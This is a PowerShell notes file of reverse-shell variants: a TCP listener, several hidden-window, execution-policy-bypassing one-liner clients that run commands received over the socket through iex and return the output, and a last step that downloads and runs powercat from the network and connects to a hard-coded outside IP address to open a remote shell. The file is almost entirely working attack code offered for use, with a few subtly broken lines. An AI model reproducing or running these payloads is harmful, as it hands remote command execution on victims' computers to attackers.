$ip = 127.0.0.1
$port = 413
# Server
$Listener = [System.Net.Sockets.TcpListener]9999;
$Listener.Start();
#wait, try connect from another PC etc.
$Listener.Stop();

# Client
# Oneliner
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("$ip",$port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
# Split
powershell -NoP -NonI -W Hidden -Exec Bypass -Command `
    New-Object System.Net.Sockets.TCPClient("$ip",$port);$stream = $client.GetStream();`
    [byte[]]$bytes = 0..65535|%{0};`
    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)`
    {;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);`
    $sendback = (iex $data 2>&1 | Out-String );`
    $sendback2  = $sendback + "PS " + (pwd).Path + "> ";`
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);`
    
    $stream.Write($sendbyte,0,$sendbyte.Length);`
    $stream.Flush()};`
    $client.Close()

# Client 2
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient($ip,$port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"


# Client 3 - Works well!
$client = New-Object System.Net.Sockets.TCPClient("$ip",$port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

# Client 4 
iwr https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1 | iex
powercat -c 51.38.185.232 -p 413 -ep -Verbose